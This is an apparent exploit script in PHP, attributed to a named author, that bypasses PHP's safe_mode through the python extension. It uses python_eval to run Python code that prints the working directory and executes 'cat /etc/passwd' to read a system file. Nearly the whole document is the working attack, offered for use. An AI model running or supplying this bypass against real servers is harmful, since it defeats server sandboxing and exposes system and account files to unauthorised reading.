&lt;?php
/*
  php_python_bypass.php
  php python extension safe_mode bypass
  Amir Salmani - amir[at]salmani[dot]ir
*/

//python ext. installed?
if (!extension_loaded(&#039;python&#039;)) die(&quot;python extension is not installed\n&quot;);

//eval python code
$res = python_eval(&#039;
import os
pwd = os.getcwd()
print pwd
os.system(&#039;cat /etc/passwd&#039;)
&#039;);

//show result
echo $res;
?&gt;

